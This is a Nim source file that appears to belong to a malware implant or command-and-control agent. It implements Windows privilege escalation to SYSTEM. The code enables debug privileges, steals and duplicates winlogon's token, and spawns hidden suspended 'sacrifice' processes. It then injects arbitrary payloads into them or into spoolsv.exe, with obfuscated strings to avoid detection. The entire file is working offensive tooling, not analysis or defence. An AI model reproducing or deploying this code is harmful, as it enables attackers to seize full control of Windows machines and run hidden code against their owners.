import std/json
from std/strutils import strip, toLowerAscii
import ../../utils/global
import ../../utils/general/strings
from ../injection/core import injectPayload
import ../../utils/winapi/handlers as winapi
import ../../utils/winapi/syscall
import ../../utils/winapi/utils

const
  th32CsSnapProcess* = 0x00000002'u32
  invalidHandle* = cast[pointer](-1)
  processQueryLimited* = 0x1000'u32
  tokenDuplicate* = 0x0002'u32
  tokenAllAccess* = 0xF01FF'u32
  scManagerConnect* = 0x0001'u32
  serviceQueryStatus* = 0x0004'u32
  serviceStart* = 0x0010'u32
  scStatusProcessInfo* = 0'u32
  serviceStopped* = 0x00000001'u32
  serviceRunning* = 0x00000004'u32
  tokenImpersonation* = 1'u32
  tokenPrimary* = 1'u32
  securityImpersonation* = 2'u32
  createSuspended* = 0x4'u32
  createNoWindow* = 0x08000000'u32
  startfUseShowWindow* = 0x1'u32
  swHide* = 0'u16
  invalidFileAttributes* = 0xFFFFFFFF'u32
  sePrivilegeEnabled* = 0x00000002'u32
  tokenQuery* = 0x0008'u32
  tokenAdjust* = 0x0020'u32
  processDupHandle* = 0x0040'u32
  duplicateSameAccess* = 0x00000002'u32

type
  Luid* = object
    lowPart*, highPart*: culong

  LuidAttr* = object
    luid: Luid
    attributes: culong

  TokenPrivileges* = object
    count: culong
    privileges: array[3, LuidAttr]

  ProcessEntry32W* = object
    dwSize: uint32
    cntUsage: uint32
    th32ProcessID: uint32
    th32DefaultHeapID: uint64
    th32ModuleID: uint32
    cntThreads: uint32
    th32ParentProcessID: uint32
    pcPriClassBase: int32
    dwFlags: uint32
    szExeFile: array[260, uint16]

  ServiceStatusProcess* = object
    dwServiceType: culong
    dwCurrentState: culong
    dwControlsAccepted: culong
    dwWin32ExitCode: culong
    dwServiceSpecificExitCode: culong
    dwCheckPoint: culong
    dwWaitHint: culong
    dwProcessId: culong
    dwServiceFlags: culong

  ProcessInfo* = object
    hProcess*, hThread*: pointer
    dwProcessId*, dwThreadId*: uint32

  StartupInfoW* = object
    cb: culong
    reserved: pointer
    desktop: pointer
    title: pointer
    x, y, xSize, ySize: culong
    xCountChars, yCountChars: culong
    fillAttribute: culong
    flags: culong
    showWindow: uint16
    cbReserved2: uint16
    lpReserved2: pointer
    hStdInput, hStdOutput, hStdError: pointer

proc impersonateByPid*(pid: culong; hOut: var pointer): bool =
  # Impersonates the token of a process by pid
  hOut = nil
  let procH = openProcess(pid, processQueryLimited)
  if procH == nil:
    return false
  var token: pointer = nil
  let stTok = openProcessToken(procH, tokenDuplicate, addr token)
  discard ntCloseHandle(procH)
  if stTok != 0:
    return false
  var sa = SECURITY_ATTRIBUTES(
    nLength: culong sizeof(SECURITY_ATTRIBUTES),
    lpSecurityDescriptor: nil,
    bInheritHandle: 0
  )
  var dup: pointer = nil
  let dupOk = winapi.duplicateTokenEx(
    token, tokenAllAccess, addr sa, securityImpersonation, tokenImpersonation, addr dup)
  if dupOk == 0:
    discard ntCloseHandle(token)
    return false
  discard ntCloseHandle(token)
  if winapi.impersonateLoggedOnUser(dup) == 0:
    discard ntCloseHandle(dup)
    return false
  hOut = dup
  true

proc getTrustedInstallerPid*(): culong =
  # Finds the pid of the trusted installer service
  var db = obf("ServicesActive")
  let scm = winapi.openSCManagerA(nil, cast[pointer](unsafeAddr db[0]), scManagerConnect)
  if scm == nil:
    return 0
  var svcName = obf("TrustedInstaller")
  let svcAccess = serviceQueryStatus or serviceStart
  let svc = winapi.openServiceA(scm, cast[pointer](unsafeAddr svcName[0]), svcAccess)
  discard winapi.closeHandle(scm)
  if svc == nil:
    return 0
  defer:
    discard winapi.closeHandle(svc)
  var ssp: ServiceStatusProcess
  var pid: culong = 0
  var waitLoops = 0
  while true:
    var need: culong = 0
    let qOk = winapi.queryServiceStatusEx(svc, scStatusProcessInfo, addr ssp,
        culong sizeof(ssp), addr need)
    if qOk == 0:
      break
    if ssp.dwCurrentState == serviceStopped:
      discard winapi.startServiceA(svc, 0, nil)
    if ssp.dwCurrentState == serviceRunning:
      pid = ssp.dwProcessId
      break
    waitLoops += 1
    if waitLoops > 12:
      break
    winapi.sleepMs(5000)
  pid

proc resolveHostingProcess*(params: string): string =
  # Reads the hosting process name from the params
  try:
    let p = parseJson(params)
    if p.hasKey(obf("process")):
      let s = p[obf("process")].getStr().strip(chars = {'"', '\''})
      if s.len > 0:
        return s
  except JsonParsingError:
    discard
  obf("spoolsv.exe")

proc paramGetsystemMethod*(params: string): string =
  # Reads the getsystem method from the params
  proc tagOf(raw: string): string =
    # Maps a raw method value to a method tag
    let s = raw.strip(chars = {'"', '\''}).toLowerAscii()
    if s == obf("inject") or s == obf("1"):
      obf("inject")
    elif s == obf("token") or s == obf("2"):
      obf("token")
    elif s == obf("com") or s == obf("3"):
      obf("com")
    else:
      ""
  try:
    let p = parseJson(params)
    if not p.hasKey(obf("method")):
      return obf("inject")
    let n = p[obf("method")]
    if n.kind == JInt:
      return tagOf($n.getInt())
    return tagOf(n.getStr())
  except JsonParsingError:
    obf("inject")

proc resolveSpawnPath*(params: string): string =
  # Reads the spawn path from the params
  try:
    let p = parseJson(params)
    if p.hasKey(obf("sacrifice")):
      let s = p[obf("sacrifice")].getStr().strip(chars = {'"', '\''})
      if s.len > 0:
        return s
    if p.hasKey(obf("path")):
      let s = p[obf("path")].getStr().strip(chars = {'"', '\''})
      if s.len > 0:
        return s
  except JsonParsingError:
    discard
  sacrificeProcess

proc pathExists*(path: string): bool =
  # Checks that a path exists on disk
  var w: array[260, uint16]
  asciiWide(path, w)
  winapi.getFileAttributesW(addr w[0]) != invalidFileAttributes

proc lookupPrivilegeLuid(name: string; outLuid: var Luid): bool =
  # Looks up the luid of a privilege name
  var wname: array[64, uint16]
  if name.len >= wname.len:
    return false
  asciiWide(name, wname)
  winapi.lookupPrivilegeValueW(nil, addr wname[0], addr outLuid) != 0

proc adjustPrivsOk(st: culong): bool =
  # Checks that an adjust privileges status is acceptable
  st == 0 or st == 0x00000106'u32

proc enablePrivilegeOnToken(token: pointer; privName: string): bool =
  # Enables one privilege on a token
  var tp: TokenPrivileges
  tp.count = 1
  if not lookupPrivilegeLuid(privName, tp.privileges[0].luid):
    return false
  tp.privileges[0].attributes = sePrivilegeEnabled
  let st = adjustPrivilegesToken(token, 0, addr tp, culong sizeof(tp), nil, nil)
  adjustPrivsOk(st)

proc enableSeDebugPrivilege*(): bool =
  # Enables the debug privilege on the current process
  var procTok: pointer = nil
  if openProcessToken(currentProcess, tokenQuery or tokenAdjust,
      addr procTok) != 0:
    return false
  defer:
    discard ntCloseHandle(procTok)
  enablePrivilegeOnToken(procTok, obf("SeDebugPrivilege"))

proc enableProcessCreationPrivileges*(): bool =
  # Enables privileges needed to create a process
  var threadTok: pointer = nil
  let th = winapi.getCurrentThread()
  if winapi.openThreadToken(th, tokenQuery or tokenAdjust, 0, addr threadTok) == 0:
    return false
  defer:
    if threadTok != nil:
      discard ntCloseHandle(threadTok)

  if not enablePrivilegeOnToken(threadTok, obf("SeImpersonatePrivilege")):
    return false
  discard enablePrivilegeOnToken(threadTok, obf("SeAssignPrimaryTokenPrivilege"))
  discard enablePrivilegeOnToken(threadTok, obf("SeIncreaseQuotaPrivilege"))
  true

proc duplicateAsPrimaryToken*(src: pointer; hOut: var pointer): bool =
  # Duplicates a token as a primary token
  hOut = nil
  if src == nil:
    return false
  var sa = SECURITY_ATTRIBUTES(
    nLength: culong sizeof(SECURITY_ATTRIBUTES),
    lpSecurityDescriptor: nil,
    bInheritHandle: 0
  )
  var prim: pointer = nil
  let dupOk = winapi.duplicateTokenEx(
    src, tokenAllAccess, addr sa, securityImpersonation, tokenPrimary, addr prim)
  if dupOk == 0:
    return false
  hOut = prim
  true

proc spawnSuspendedProcessAsUser*(hPrimaryToken: pointer; cmdLine: string;
    pi: var ProcessInfo): bool =
  # Spawns a suspended process with a primary token
  if hPrimaryToken == nil:
    return false
  if cmdLine.len == 0 or cmdLine.len >= 2048 or not pathExists(cmdLine):
    return false
  var wcmd: array[2048, uint16]
  asciiWide(cmdLine, wcmd)
  var si: StartupInfoW
  zeroMem(addr si, sizeof(si))
  si.cb = culong sizeof(StartupInfoW)
  si.flags = startfUseShowWindow
  si.showWindow = swHide
  zeroMem(addr pi, sizeof(pi))
  let flags = createSuspended or createNoWindow
  var ok = winapi.createProcessWithTokenW(
    hPrimaryToken, 0, nil, addr wcmd[0], flags, nil, nil, addr si, addr pi) != 0
  if ok:
    return true
  ok = winapi.createProcessAsUserW(
    hPrimaryToken, nil, addr wcmd[0], nil, nil, 0, flags,
    nil, nil, addr si, addr pi) != 0
  ok

proc findProcessPidByName*(exeName: string): uint32 =
  # Finds a process pid by executable name
  let snap = winapi.createToolhelp32Snapshot(th32CsSnapProcess, 0)
  if snap == invalidHandle:
    return 0
  defer:
    discard winapi.closeHandle(snap)
  var entry: ProcessEntry32W
  entry.dwSize = uint32(sizeof(ProcessEntry32W))
  if winapi.process32FirstW(snap, addr entry) == 0:
    return 0
  while true:
    var match = true
    if exeName.len >= entry.szExeFile.len:
      match = false
    else:
      for i in 0 ..< exeName.len:
        if entry.szExeFile[i] != uint16(exeName[i]):
          match = false
          break
      if match and entry.szExeFile[exeName.len] != 0'u16:
        match = false
    if match:
      return entry.th32ProcessID
    if winapi.process32NextW(snap, addr entry) == 0:
      break
  0

proc findWinlogonPid*(): uint32 =
  # Finds the pid of winlogon
  findProcessPidByName(obf("winlogon.exe"))

proc processExeBaseName*(path: string): string =
  # Returns the executable name from a path
  var i = path.len - 1
  while i >= 0:
    if path[i] == '\\' or path[i] == '/':
      return path[i + 1 .. ^1]
    dec i
  path

proc findNewestProcessPidByName*(exeName: string): uint32 =
  # Finds the highest pid that matches an executable name
  let snap = winapi.createToolhelp32Snapshot(th32CsSnapProcess, 0)
  if snap == invalidHandle:
    return 0
  defer:
    discard winapi.closeHandle(snap)
  var entry: ProcessEntry32W
  entry.dwSize = uint32(sizeof(ProcessEntry32W))
  if winapi.process32FirstW(snap, addr entry) == 0:
    return 0
  var bestPid: uint32 = 0
  while true:
    var match = true
    if exeName.len >= entry.szExeFile.len:
      match = false
    else:
      for i in 0 ..< exeName.len:
        if entry.szExeFile[i] != uint16(exeName[i]):
          match = false
          break
      if match and entry.szExeFile[exeName.len] != 0'u16:
        match = false
    if match and entry.th32ProcessID > bestPid:
      bestPid = entry.th32ProcessID
    if winapi.process32NextW(snap, addr entry) == 0:
      break
  bestPid

proc closeTokenHandle*(h: pointer) =
  # Closes a token handle when it is open
  if h != nil:
    discard ntCloseHandle(h)

proc elevateSystemTrusted*(hPrimaryForSpawn: var pointer): bool =
  # Builds a primary token from the winlogon process
  hPrimaryForSpawn = nil
  var hTokenSystem: pointer = nil

  let winlogonPid = findWinlogonPid()
  if winlogonPid == 0:
    return false

  if not impersonateByPid(culong(winlogonPid), hTokenSystem):
    return false

  if not enableProcessCreationPrivileges():
    closeTokenHandle(hTokenSystem)
    discard winapi.revertToSelf()
    return false

  if not duplicateAsPrimaryToken(hTokenSystem, hPrimaryForSpawn):
    closeTokenHandle(hTokenSystem)
    discard winapi.revertToSelf()
    return false

  closeTokenHandle(hTokenSystem)
  true

proc getSystemRemoteInject*(payload: openArray[byte]; params: string): (bool,
    uint32, string) =
  # Injects a payload into a remote hosting process
  result = (false, 0'u32, "")
  if payload.len == 0:
    return
  let hostingProcess = resolveHostingProcess(params)
  result[2] = hostingProcess
  if not enableSeDebugPrivilege():
    return
  let pid = findProcessPidByName(hostingProcess)
  if pid == 0:
    return
  let hostH = openProcess(culong(pid), processDupHandle)
  if hostH == nil:
    return
  defer:
    discard ntCloseHandle(hostH)
  var injectH: pointer = nil
  if winapi.duplicateHandle(
      hostH, currentProcess, currentProcess, addr injectH, 0, 0,
      duplicateSameAccess) == 0:
    return
  defer:
    discard ntCloseHandle(injectH)
  let hThread = injectPayload(injectH, payload)
  if hThread == nil:
    return
  discard ntCloseHandle(hThread)
  result = (true, pid, hostingProcess)

proc getSystemTrustedInject*(payload: openArray[byte]; params: string): (bool,
    uint32, string) =
  # Spawns a trusted process and injects the payload
  result = (false, 0'u32, "")
  if payload.len == 0:
    return
  var hPrimary: pointer = nil
  if not elevateSystemTrusted(hPrimary):
    return
  let spawnPath = resolveSpawnPath(params)
  var pi: ProcessInfo
  if not spawnSuspendedProcessAsUser(hPrimary, spawnPath, pi):
    closeTokenHandle(hPrimary)
    discard winapi.revertToSelf()
    return
  closeTokenHandle(hPrimary)
  let hThread = injectPayload(pi.hProcess, payload)
  if hThread == nil:
    discard ntCloseHandle(pi.hThread)
    discard ntCloseHandle(pi.hProcess)
    discard winapi.revertToSelf()
    return
  discard winapi.resumeThread(pi.hThread)
  discard ntCloseHandle(hThread)
  discard ntCloseHandle(pi.hThread)
  discard ntCloseHandle(pi.hProcess)
  discard winapi.revertToSelf()
  result = (true, pi.dwProcessId, spawnPath)
